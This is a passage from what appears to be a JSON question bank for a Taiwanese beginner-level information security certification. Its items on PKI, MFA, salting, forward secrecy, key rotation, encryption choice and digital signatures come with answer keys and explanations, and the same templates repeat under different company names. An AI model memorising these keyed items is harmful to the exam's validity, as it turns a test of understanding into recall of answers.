    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-505",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. OCSP（線上憑證狀態協定）",
      "B. DNS 解析協定",
      "C. Telnet 協定",
      "D. SMTP 郵件傳輸協定"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-506",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "B. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "C. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "D. 員工工號 ＋ 身份證字號（兩者皆為所知）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-507",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "B. 讓密碼可以在遺忘時輕鬆還原明文",
      "C. 減少資料庫儲存空間",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-508",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某跨國金融控股銀行資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容",
      "B. 能讓傳輸速度提升 100 倍",
      "C. 能夠防止受害者遭遇釣魚網站欺騙",
      "D. 能夠完全取代防火牆"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-509",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 只要沒被偷就可以永久使用無需變更",
      "B. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "C. 降低金鑰長度至 56-bit",
      "D. 將金鑰直接張貼於內部公告欄以利備份"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-510",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所處（Somewhere you are）",
      "B. 所具（Something you are）",
      "C. 所知（Something you know）",
      "D. 所持（Something you have）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-511",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. Caesar 凱薩密碼",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-512",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 伺服器的私鑰（Server's Private Key）",
      "B. 伺服器的公鑰（Server's Public Key）",
      "C. 客戶端自己的公鑰",
      "D. 客戶端自己的私鑰"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-513",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 交易不可否認性",
      "B. 資料機密性（Confidentiality）加密",
      "C. 伺服器身分鑑別",
      "D. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-514",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 對稱式 AES-128 加密",
      "B. 建立 VPN 虛擬私人通道",
      "C. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）",
      "D. 設定高強度資料庫密碼"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-515",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. Telnet 協定",
      "B. DNS 解析協定",
      "C. OCSP（線上憑證狀態協定）",
      "D. SMTP 郵件傳輸協定"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-516",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "B. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "C. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "D. 員工工號 ＋ 身份證字號（兩者皆為所知）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-517",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "B. 加快密碼雜湊運算速度以降低 CPU 負擔",
      "C. 讓密碼可以在遺忘時輕鬆還原明文",
      "D. 減少資料庫儲存空間"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-518",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能讓傳輸速度提升 100 倍",
      "D. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-519",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 降低金鑰長度至 56-bit",
      "B. 將金鑰直接張貼於內部公告欄以利備份",
      "C. 只要沒被偷就可以永久使用無需變更",
      "D. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-520",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所處（Somewhere you are）",
      "B. 所知（Something you know）",
      "C. 所具（Something you are）",
      "D. 所持（Something you have）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-521",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. Caesar 凱薩密碼",
      "B. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "C. MD5（單向雜湊演算法）",
      "D. RSA-4096（非對稱演算法）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-522",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的公鑰",
      "B. 伺服器的私鑰（Server's Private Key）",
      "C. 伺服器的公鑰（Server's Public Key）",
      "D. 客戶端自己的私鑰"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-523",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 伺服器身分鑑別",
      "B. 交易不可否認性",
      "C. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "D. 資料機密性（Confidentiality）加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-524",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 設定高強度資料庫密碼",
      "B. 建立 VPN 虛擬私人通道",
      "C. 對稱式 AES-128 加密",
      "D. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-525",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. SMTP 郵件傳輸協定",
      "B. OCSP（線上憑證狀態協定）",
      "C. Telnet 協定",
      "D. DNS 解析協定"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-526",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "B. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "C. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "D. 英文密碼 ＋ 數字密碼（兩者皆為所知）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-527",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 減少資料庫儲存空間",
      "B. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "C. 讓密碼可以在遺忘時輕鬆還原明文",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-528",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容",
      "B. 能讓傳輸速度提升 100 倍",
      "C. 能夠完全取代防火牆",
      "D. 能夠防止受害者遭遇釣魚網站欺騙"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-529",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 將金鑰直接張貼於內部公告欄以利備份",
      "B. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "C. 只要沒被偷就可以永久使用無需變更",
      "D. 降低金鑰長度至 56-bit"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-530",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所持（Something you have）",
      "B. 所知（Something you know）",
      "C. 所處（Somewhere you are）",
      "D. 所具（Something you are）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-531",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "B. RSA-4096（非對稱演算法）",
      "C. Caesar 凱薩密碼",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-532",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 伺服器的公鑰（Server's Public Key）",
      "B. 客戶端自己的公鑰",
      "C. 客戶端自己的私鑰",
